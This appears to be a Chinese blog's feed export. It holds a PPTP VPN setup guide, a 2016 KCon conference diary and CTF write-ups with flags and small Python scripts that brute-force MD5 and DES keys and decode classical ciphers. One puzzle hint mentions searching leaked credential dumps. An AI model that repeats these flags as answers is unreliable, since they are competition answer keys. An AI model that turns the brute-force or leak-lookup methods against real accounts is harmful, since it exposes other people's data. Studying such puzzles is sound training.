        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>科学上网—-利用阿里云ECS架设VPN</p><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><ol><li>阿里云上ECS上架设VPN</li><li>本地连接使用VPN拨号到阿里云ECS</li><li>使用阿里云实现翻墙等功能</li></ol><h1 id="首先要台国外IP的服务器"><a href="#首先要台国外IP的服务器" class="headerlink" title="首先要台国外IP的服务器"></a>首先要台国外IP的服务器</h1><h1 id="架设VPN"><a href="#架设VPN" class="headerlink" title="架设VPN"></a>架设VPN</h1><h2 id="安装ppp-pptpd-iptables"><a href="#安装ppp-pptpd-iptables" class="headerlink" title="安装ppp pptpd iptables"></a>安装ppp pptpd iptables</h2><p>ppp 数据链层协议<br>pptpd VPN服务类型<br>iptables 防火墙，用来消息转发<br><code>yum install ppp pptpd iptables</code><br>安装后的版本信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$ lsb_release -a  </span><br><span class="line">LSB Version:    :base-4.0-amd64:base-4.0-noarch:core-4.0-amd64:core-4.0-noarch  </span><br><span class="line">Distributor ID: CentOS  </span><br><span class="line">Description:    CentOS release 6.6 (Final)  </span><br><span class="line">Release:    6.6  </span><br><span class="line">Codename:   Final  </span><br><span class="line">$ pptpd --version  </span><br><span class="line">pptpd v1.4.0  </span><br><span class="line">$ iptables --version  </span><br><span class="line">iptables v1.4.7</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="配置ppp-DNS-信息"><a href="#配置ppp-DNS-信息" class="headerlink" title="配置ppp DNS 信息"></a>配置ppp DNS 信息</h2><h3 id="编辑-options-pptpd-配置文件"><a href="#编辑-options-pptpd-配置文件" class="headerlink" title="编辑 options.pptpd 配置文件"></a>编辑 options.pptpd 配置文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;ppp&#x2F;options.pptpd</span><br></pre></td></tr></table></figure><p>修改为一下内容 去掉前面的# </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ms-dns 8.8.8.8</span><br><span class="line">ms-dns 8.8.4.4</span><br></pre></td></tr></table></figure><h2 id="配置ppp-VPN帐号信息"><a href="#配置ppp-VPN帐号信息" class="headerlink" title="配置ppp VPN帐号信息"></a>配置ppp VPN帐号信息</h2><h3 id="编辑chap-secrets配置文件"><a href="#编辑chap-secrets配置文件" class="headerlink" title="编辑chap-secrets配置文件"></a>编辑chap-secrets配置文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;ppp&#x2F;chap-secrets</span><br></pre></td></tr></table></figure><h3 id="设置规则为VPN帐号-服务类型-VPN密码-IP-若IP为-则代表所有IP都可以使用该帐号密码"><a href="#设置规则为VPN帐号-服务类型-VPN密码-IP-若IP为-则代表所有IP都可以使用该帐号密码" class="headerlink" title="设置规则为VPN帐号 服务类型 VPN密码 IP,若IP为*则代表所有IP都可以使用该帐号密码"></a>设置规则为VPN帐号 服务类型 VPN密码 IP,若IP为*则代表所有IP都可以使用该帐号密码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># Secrets for authentication using CHAP  </span><br><span class="line"># client    server  secret          IP addresses  </span><br><span class="line">SeeSea   pptpd   wing       *</span><br></pre></td></tr></table></figure><p>这里帐号是SeeSea 密码是wing   </p><h2 id="配置pptpd"><a href="#配置pptpd" class="headerlink" title="配置pptpd"></a>配置pptpd</h2><h3 id="编辑options-pptpd-配置文件"><a href="#编辑options-pptpd-配置文件" class="headerlink" title="编辑options.pptpd 配置文件"></a>编辑options.pptpd 配置文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;pptpd.conf</span><br></pre></td></tr></table></figure><h3 id="修改成一下内容，将注释去掉即可"><a href="#修改成一下内容，将注释去掉即可" class="headerlink" title="修改成一下内容，将注释去掉即可"></a>修改成一下内容，将注释去掉即可</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">localip 192.168.0.1</span><br><span class="line">remoteip 192.168.0.234-238,192.168.0.245</span><br></pre></td></tr></table></figure><h2 id="配置内核支持转发"><a href="#配置内核支持转发" class="headerlink" title="配置内核支持转发"></a>配置内核支持转发</h2><h3 id="编辑sysctl-conf-配置文件"><a href="#编辑sysctl-conf-配置文件" class="headerlink" title="编辑sysctl.conf 配置文件"></a>编辑sysctl.conf 配置文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;sysctl.conf</span><br></pre></td></tr></table></figure><h3 id="找到第7行进行修改-修改结果为"><a href="#找到第7行进行修改-修改结果为" class="headerlink" title="找到第7行进行修改  修改结果为"></a>找到第7行进行修改  修改结果为</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net.ipv4.ip_forward &#x3D; 1</span><br></pre></td></tr></table></figure><h3 id="重新加载内核配置项"><a href="#重新加载内核配置项" class="headerlink" title="重新加载内核配置项"></a>重新加载内核配置项</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysctl -p</span><br></pre></td></tr></table></figure><h2 id="配置iptables"><a href="#配置iptables" class="headerlink" title="配置iptables"></a>配置iptables</h2><h3 id="首次运行-iptables-查看iptables运行状态"><a href="#首次运行-iptables-查看iptables运行状态" class="headerlink" title="首次运行 iptables 查看iptables运行状态"></a>首次运行 iptables 查看iptables运行状态</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">service iptables status</span><br><span class="line">iptables: Firewall is not running</span><br></pre></td></tr></table></figure><p><strong>启动iptables服务</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -L -n</span><br></pre></td></tr></table></figure><h2 id="配置规则"><a href="#配置规则" class="headerlink" title="配置规则"></a>配置规则</h2><h3 id="第一次配置"><a href="#第一次配置" class="headerlink" title="第一次配置"></a>第一次配置</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -i lo -j ACCEPT #允许127.0.0.1访问本地服务  </span><br><span class="line">iptables -A INPUT -m state --state ESTABLISHED -j ACCEPT #允许访问外部服务  </span><br><span class="line">iptables -A INPUT -p icmp -m icmp --icmp-type 8 -j ACCEPT #允许 ping  </span><br><span class="line">iptables -A INPUT -p tcp --dport 22 -j ACCEPT #开启 ssh 端口</span><br></pre></td></tr></table></figure><h3 id="已经配置-iptables"><a href="#已经配置-iptables" class="headerlink" title="已经配置 iptables"></a>已经配置 iptables</h3><p>设置转发策略（because 阿里云是双网卡，内网eth0,外网eth1）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -A POSTROUTING -s 192.168.0.0&#x2F;24 -o eth1 -jMASQUERADE </span><br></pre></td></tr></table></figure><h3 id="设置VPN端口策略"><a href="#设置VPN端口策略" class="headerlink" title="设置VPN端口策略"></a>设置VPN端口策略</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -p tcp --dport 1723 -j ACCEPT</span><br></pre></td></tr></table></figure><h3 id="保存iptables-选项并重新启动iptables"><a href="#保存iptables-选项并重新启动iptables" class="headerlink" title="保存iptables 选项并重新启动iptables"></a>保存iptables 选项并重新启动iptables</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service iptables save</span><br></pre></td></tr></table></figure><p>##Finally</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">service iptables restart #重新启动 iptables  </span><br><span class="line">sudo service pptpd restart #重新启动 pptpd  </span><br><span class="line">sudo chkconfig iptables on #开机启动 iptables  </span><br><span class="line">sudo chkconfig pptpd on #开机启动 pptpd  </span><br><span class="line">sudo iptables -P INPUT DROP #加载防火墙策略  </span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="各种参考资料"><a href="#各种参考资料" class="headerlink" title="各种参考资料"></a>各种参考资料</h1><p><a href="http://blog.sina.com.cn/s/blog_3eba8f1c0102uxyc.html" title="阿里云" class="gallery-item"><img src="http://blog.sina.com.cn/s/blog_3eba8f1c0102uxyc.html" alt="阿里云"></a><br><a href="http://blog.abv.cn/?p=50" title="阿里云Centos配置iptables防火墙" class="gallery-item"><img src="http://blog.abv.cn/?p=50" alt="阿里云Centos配置iptables防火墙"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 科学上网 </tag>
            
            <tag> VPN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2016黑客西部大会</title>
      <link href="2016-Hackers-Western-Conference.html"/>
      <url>2016-Hackers-Western-Conference.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="会议前一晚"><a href="#会议前一晚" class="headerlink" title="会议前一晚"></a>会议前一晚</h1><h2 id="Day-6月3日"><a href="#Day-6月3日" class="headerlink" title="Day:6月3日"></a>Day:6月3日</h2><p>为了参加Kcon’麦香师傅和我提前一天去了城里。去城里阿…好久没进城啦~  </p><h3 id="第一幕"><a href="#第一幕" class="headerlink" title="第一幕"></a>第一幕</h3><p>找了家宾馆，然后麦香师傅带我去吃好吃的啦<del>~</del><br><a href="http://o89648qv2.bkt.clouddn.com/2.jpg" class="gallery-item"><img src="http://o89648qv2.bkt.clouddn.com/2.jpg"></a><br>我只能说 麦香师傅你真是小龙虾达人。对了你不是知道我不能吃辣嘛…把我辣哭了..</p><h3 id="第二幕"><a href="#第二幕" class="headerlink" title="第二幕"></a>第二幕</h3><p>我们转了第二场，网咖…<br>我也是服了 麦香师傅在网吧看乌云…果然真大表哥…<br><a href="http://o89648qv2.bkt.clouddn.com/3.jpg" class="gallery-item"><img src="http://o89648qv2.bkt.clouddn.com/3.jpg"></a> 忽视右下角…</p><h3 id="第三幕"><a href="#第三幕" class="headerlink" title="第三幕"></a>第三幕</h3><p>我们去了芙蓉街看他们撸串…以及喝酒..我还是个孩子阿 （其实我很能喝，至少不是麦香师傅两杯倒）</p><h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>今天晚上认识了好几个人，四叶草一大波，.贤唐表哥–阿里应急中心的，LinE–感觉就是硬件&amp;&amp;二进制的大表哥（麦香师傅他是不是和你有肮脏的PY交易）以及好多好多…<br>（ps:认识了一个厦门的大哥 Jonny）</p><h1 id="会议当天"><a href="#会议当天" class="headerlink" title="会议当天"></a>会议当天</h1><h2 id="Day-6月4日"><a href="#Day-6月4日" class="headerlink" title="Day:6月4日"></a>Day:6月4日</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>哎呀妈呀迟到啦…错过了摇滚<br><a href="http://o89648qv2.bkt.clouddn.com/4.jpg" class="gallery-item"><img src="http://o89648qv2.bkt.clouddn.com/4.jpg"></a></p><h3 id="议题-amp-amp-学习到的东西"><a href="#议题-amp-amp-学习到的东西" class="headerlink" title="议题&amp;&amp;学习到的东西"></a>议题&amp;&amp;学习到的东西</h3><p>一下省略几千个字，等我睡醒了再来整理..<br><a href="http://o89648qv2.bkt.clouddn.com/%E8%AE%AE%E9%A2%98.jpg" class="gallery-item"><img src="http://o89648qv2.bkt.clouddn.com/%E8%AE%AE%E9%A2%98.jpg"></a><br>我拿了几个我比较有感触的议题</p><h4 id="网络空间对抗–基础决定成败"><a href="#网络空间对抗–基础决定成败" class="headerlink" title="网络空间对抗–基础决定成败"></a>网络空间对抗–基础决定成败</h4><h4 id="一起跨国网络诈骗案的始末"><a href="#一起跨国网络诈骗案的始末" class="headerlink" title="一起跨国网络诈骗案的始末"></a>一起跨国网络诈骗案的始末</h4><h4 id="多活的5年"><a href="#多活的5年" class="headerlink" title="多活的5年"></a>多活的5年</h4><h4 id="基于大数据的僵尸网络攻击监控"><a href="#基于大数据的僵尸网络攻击监控" class="headerlink" title="基于大数据的僵尸网络攻击监控"></a>基于大数据的僵尸网络攻击监控</h4><h4 id="浅谈安全主战场转移"><a href="#浅谈安全主战场转移" class="headerlink" title="浅谈安全主战场转移"></a>浅谈安全主战场转移</h4><h3 id="最后附上几张图片以及我的感触。"><a href="#最后附上几张图片以及我的感触。" class="headerlink" title="最后附上几张图片以及我的感触。"></a>最后附上几张图片以及我的感触。</h3><p>信安圈子真的很小，做信安真不是一下子就能成为大牛的。<br>以及我学到了他们的思考模式，到了他们这种阶段不仅要获取在获取新的知识，也有了自己各自研究的方向。</p><p>总而言之继续加油吧！！！</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kcon </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>陕西省网络空间安全技术大赛</title>
      <link href="2016-Networ-space-security-technology-competition-of-shaanxi.html"/>
      <url>2016-Networ-space-security-technology-competition-of-shaanxi.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="比赛前夜…"><a href="#比赛前夜…" class="headerlink" title="比赛前夜…"></a>比赛前夜…</h1><p>大家玩得挺嗨的，还没比赛酒店都打起来了，金总一下午就拿了个路由器开了AP隔离，金总就是6666   </p><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><h2 id="MIsc"><a href="#MIsc" class="headerlink" title="MIsc"></a><strong>MIsc</strong></h2><h3 id="Misc-2"><a href="#Misc-2" class="headerlink" title="Misc_2"></a>Misc_2</h3><p> png图 首先套路，winhex看一下头。</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-shanxi-01.bmp" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-shanxi-01.bmp"></a></p><p>明显少了个头。给他加上、<br>打开图片</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-shanxi-2.bmp" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-shanxi-2.bmp"></a></p><p>都是套路阿……</p><h3 id="Misc-5"><a href="#Misc-5" class="headerlink" title="Misc_5"></a>Misc_5</h3><p>一个伪加密。我还是用手机的方法打开了。密码是flag</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-shanxi-3.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-shanxi-3.jpg"></a></p><p>打开是个社工题。查下裤子吧。</p><h3 id="Misc-6"><a href="#Misc-6" class="headerlink" title="Misc_6"></a>Misc_6</h3><p>png 图片隐写还是用winhex打开。<br>上次在PCTF学到另外一个打开的姿势。就不用去扣图了。<br>打开是这样的…</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-shanxi-4.bmp" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-shanxi-4.bmp"></a><br>拼接好是这样的…</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-shanxi-6.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-shanxi-6.png"></a></p><p>我要吐槽一下了 特么谁会把自己的二维码剪成这样..</p><h3 id="Misc-7"><a href="#Misc-7" class="headerlink" title="Misc_7"></a>Misc_7</h3><p>左下角有个提示..<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-shanxi-7.bmp" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-shanxi-7.bmp"></a></p><p>谷歌一下把这个工具下载下来…</p><p>然后弱口令…<br>打开是个PDF文件..<br>然后在用校赛的神器…–wbs43open</p><h3 id="Misc-8"><a href="#Misc-8" class="headerlink" title="Misc_8"></a>Misc_8</h3><p>头疼的8 今天做的时候发现这图片少了一半然后我一直以为是要修复…然而没看到里面还有一张png图片…扣出来然后呢…这样做..<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-shanxi-8.bmp" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-shanxi-8.bmp"></a><br>然后</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-shanxi-9.bmp" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-shanxi-9.bmp"></a></p><h2 id="经典密码学"><a href="#经典密码学" class="headerlink" title="经典密码学.."></a>经典密码学..</h2><h3 id="C-1"><a href="#C-1" class="headerlink" title="C_1"></a>C_1</h3><p>这咋感觉是我们学校的题目…给个加密后的md5，然后给你部分已知<br>变了个套路…我让<strong>金总</strong>帮我改了个脚本…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python 2.7</span></span><br><span class="line"><span class="comment"># flag&#123;6315_hello_world_76549&#125;</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">a = <span class="string">&#x27;c44c6bfe1ba4ca9a3fd4df785eb8440e&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i1 <span class="keyword">in</span> range(<span class="number">1000</span>,<span class="number">9999</span>):</span><br><span class="line">    <span class="keyword">for</span> i2 <span class="keyword">in</span> range(<span class="number">60000</span>,<span class="number">99999</span>):</span><br><span class="line">        md5 = hashlib.md5()</span><br><span class="line">        b = <span class="string">&#x27;flag&#123;%04d_hello_world_%05d&#125;&#x27;</span>%(i1,i2)</span><br><span class="line">        md5.update(b)</span><br><span class="line">        <span class="keyword">if</span> md5.hexdigest() == a:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;%s   %s&#x27;</span> %(md5.hexdigest(), b)</span><br></pre></td></tr></table></figure><h3 id="C-2"><a href="#C-2" class="headerlink" title="C_2"></a>C_2</h3><p>汪神和我说这个是DES加密..告诉了我Okay密钥中的其中四个,还有个四个要自己爆破…我不知道阿..</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#author :汪神 Jarvis</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">c = <span class="string">&#x27;7773b6f7abc6a338bed4309ba4012bdc89101f6805057a2644ca33ea5d85c9b7daa991a8e6252951&#x27;</span>.decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line">dic = <span class="string">&#x27;0123456789&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x1 <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line"><span class="keyword">for</span> x2 <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line"><span class="keyword">for</span> x3 <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line"><span class="keyword">for</span> x4 <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">key = <span class="string">&#x27;0kay&#x27;</span>+chr(x1)+chr(x2)+chr(x3)+chr(x4)</span><br><span class="line">cipher = DES.new(key,DES.MODE_ECB)</span><br><span class="line">result = cipher.decrypt(c)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> result:</span><br><span class="line"><span class="keyword">print</span> result</span><br><span class="line"><span class="keyword">print</span> key</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="c-4"><a href="#c-4" class="headerlink" title="c_4"></a>c_4</h3><p>栅栏密码…<br>随手写了个小脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">#author:Swing</span><br><span class="line">#通用脚本</span><br><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line"># -*- coding: utf_8 -*-</span><br><span class="line"></span><br><span class="line">e &#x3D; raw_input(&#39;请输入要解密的字符串\n&#39;)</span><br><span class="line"></span><br><span class="line">elen &#x3D; len(e)</span><br><span class="line"></span><br><span class="line">field&#x3D;[]</span><br><span class="line"></span><br><span class="line">for i in range(2,elen):</span><br><span class="line"></span><br><span class="line">if(elen%i&#x3D;&#x3D;0):</span><br><span class="line"></span><br><span class="line">field.append(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for f in field:</span><br><span class="line"></span><br><span class="line">    b &#x3D; elen &#x2F; f</span><br><span class="line"></span><br><span class="line">    result &#x3D; &#123;x:&#39;&#39; for x in range(b)&#125;</span><br><span class="line"></span><br><span class="line">    for i in range(elen):</span><br><span class="line"></span><br><span class="line">        a &#x3D; i % b;</span><br><span class="line"></span><br><span class="line">        result.update(&#123;a:result[a] + e[i]&#125;)</span><br><span class="line"></span><br><span class="line">    d &#x3D; &#39;&#39;</span><br><span class="line"></span><br><span class="line">    for i in range(b):</span><br><span class="line"></span><br><span class="line">        d &#x3D; d + result[i]</span><br><span class="line"></span><br><span class="line">    print &#39;分为\t&#39;+str(f)+&#39;\t&#39;+&#39;栏时，解密结果为：  &#39;+d</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="c-5"><a href="#c-5" class="headerlink" title="c_5"></a>c_5</h3><p>这个是base64的一员不多说…</p><h3 id="c-6"><a href="#c-6" class="headerlink" title="c_6"></a>c_6</h3><p>字母频率攻击…<br><a href="http://quipqiup.com/index.php">http://quipqiup.com/index.php</a><br>这个网站完美解决…</p><h1 id="心得体会吧…"><a href="#心得体会吧…" class="headerlink" title="心得体会吧…"></a>心得体会吧…</h1><p>今年题目太多了…<br>今年参赛的人太多了…<br>今年高手比去年多多了..<br>今年又打酱油了///<br>今年我只能做一个杂项狗了…<br>明年好好努力吧…<br><del>最后挂一张图片吧 明年继续加油</del> </p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 陕西省赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Phrack--CTF 整理</title>
      <link href="2016-PCTF-Writup.html"/>
      <url>2016-PCTF-Writup.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="测试题"><a href="#测试题" class="headerlink" title="测试题"></a>测试题</h1><h2 id="Base64"><a href="#Base64" class="headerlink" title="Base64?"></a>Base64?</h2><blockquote><p>与其说是Base64其实是Base32 + Hex解码</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&gt;&gt;&gt;s=<span class="string">&#x27;GUYDIMZVGQ2DMN3CGRQTONJXGM3TINLGG42DGMZXGM3TINLGGY4DGNBXGYZTGNLGGY3DGNBWMU3WI===&#x27;</span>  </span><br><span class="line">&gt;&gt;&gt;base64.b32decode(s).decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">&gt;&gt;&gt;PCTF&#123;Just_t3st_h4v3_f4n&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="关于USS-Lab"><a href="#关于USS-Lab" class="headerlink" title="关于USS Lab"></a>关于USS Lab</h2><blockquote><p>说白了就是只是这个实验室的名字</p></blockquote><h2 id="veryeasy"><a href="#veryeasy" class="headerlink" title="veryeasy"></a>veryeasy</h2><blockquote><p>使用基本命令获取flag<br> 好吧虽然说基本命令 strings我已经在之前就知道了。<br> 可是在加上一个grep呢。</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;strings file | grep <span class="string">&quot;PCTF&quot;</span>  </span><br><span class="line">&gt;&gt;&gt;PCTF&#123;strings_i5_3asy_isnt_i7&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="段子"><a href="#段子" class="headerlink" title="段子"></a>段子</h2><blockquote><p>程序猿的圈子里有个非常著名的段子：手持两把锟斤拷，口中疾呼烫烫烫。<br>请提交其中“锟斤拷”的十六进制编码。（大写</p></blockquote><p>这个题目我用了两种解法，也算是又找了一次知识<br>1.我去百度了<del>~</del><br>2.又一次认识到了python的使用方法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;<span class="string">&#x27;PCTF&#123;%s&#125;&#x27;</span> % <span class="string">&#x27;锟斤拷&#x27;</span>.encode(<span class="string">&#x27;hex&#x27;</span>).upper()</span><br><span class="line">&gt;&gt;&gt;<span class="string">&#x27;PCTF&#123;E9949FE696A4E68BB7&#125;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="手贱"><a href="#手贱" class="headerlink" title="手贱"></a>手贱</h2><h2 id="美丽的实验室"><a href="#美丽的实验室" class="headerlink" title="美丽的实验室"></a>美丽的实验室</h2><p>这题有两种解法<br>1.stegsolve打开，第二个frame里就是答案<br><a class="gallery-item"><img src=""></a><br>2.0x7011处有第二张图，binwalk没扫出来，搜ffd9可以找到。winhex挖出来 </p><p>我最开始使用的是第二种做法 今天第一次发现有第一种方法可以做。</p><h2 id="veryeasyRSA"><a href="#veryeasyRSA" class="headerlink" title="veryeasyRSA"></a>veryeasyRSA</h2><blockquote><p>多亏了这题 因为是第一次真正接触RSA 这算我的一个入门题了吧。<br>已知RSA公钥生成参数：</p></blockquote><p>p = 3487583947589437589237958723892346254777<br>q = 8767867843568934765983476584376578389<br>e = 65537   </p><p>求d =   